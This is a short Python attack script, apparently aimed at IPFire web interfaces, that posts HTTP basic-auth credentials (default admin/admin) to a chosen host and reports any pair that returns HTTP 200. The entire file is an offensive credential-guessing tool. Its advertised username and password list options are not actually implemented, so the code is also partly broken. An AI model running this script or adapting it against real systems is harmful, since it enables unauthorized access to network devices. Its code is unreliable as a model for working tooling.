#!/usr/bin/python3

import argparse
import requests

def valid_single_param(param, alternative):
  if param:
    return param
  else:
    return alternative

def request_site(url, username, password):
  headers = {'Accept-Encoding' : 'gzip, deflate, br','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent':'IPFIRE Exploit','Referer': url,'Upgrade-Insecure-Requests':'1'}
  req = requests.post(url, headers=headers, auth=(username, password))
  if req.status_code == 200:
    found=True
    print ('[+] Usuario: {} and password: {} is valid!'.format(username, password))
    print ()
    print (req.text)
    return True
  return False  

arg_parser = argparse.ArgumentParser(prog='request.py', allow_abbrev=False)
arg_parser.add_argument('-t',required=True, type=str, help="The target hostname or ip address", metavar='')
arg_parser.add_argument('--port', type=str, default='80', help="The target port", metavar='')
arg_parser.add_argument('-u', type=str, help="The single username", metavar='')
arg_parser.add_argument('-U', type=str, help="The list of username", metavar='')
arg_parser.add_argument('-p', type=str, help="The single password", metavar='')
arg_parser.add_argument('-P', type=str, help="The list of password", metavar='')
args = arg_parser.parse_args()

url='http://' + args.t + ':' + args.port

found = False
username = valid_single_param(args.u, 'admin')
password = valid_single_param(args.p, 'admin')

if args.U:
  username = 'List user'

found = request_site(url, username, password)
if not found:
  print ('[+] No credentials was found!')